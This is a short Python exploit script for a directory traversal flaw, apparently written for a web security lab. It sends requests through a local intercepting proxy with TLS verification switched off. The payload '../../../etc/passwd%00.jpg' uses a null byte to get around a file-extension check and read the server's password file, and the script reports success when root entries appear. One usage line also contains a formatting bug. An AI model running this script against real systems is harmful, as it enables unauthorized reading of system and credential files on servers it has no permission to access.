import requests           # to make http(s) requests
import sys                # take cmds from cmd_line
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def exploit(url):
  vuln_url = url + 'image?filename=../../../etc/passwd%00.jpg'
  response = requests.get(vuln_url, verify=False, proxies=proxies)

  if ('root:x' in response.text):
    print("(+) Exploit Successful ......")
    print(f"(+) Results: {response.text}")
  else:
    print('(-) Exploit Failed')
    sys.exit(-1)

def main():
  if len(sys.argv) != 2:
    print("(+) Usage Instructions: %s <url> " % sys.argv[0])
    print("(+) Example: www.example.com" % sys.argv[0])
    sys.exit(-1)

  url = sys.argv[1]
  print("(+) Exploiting directory traversal vulnerability ......")
  exploit(url)

if __name__ == "__main__":
  main()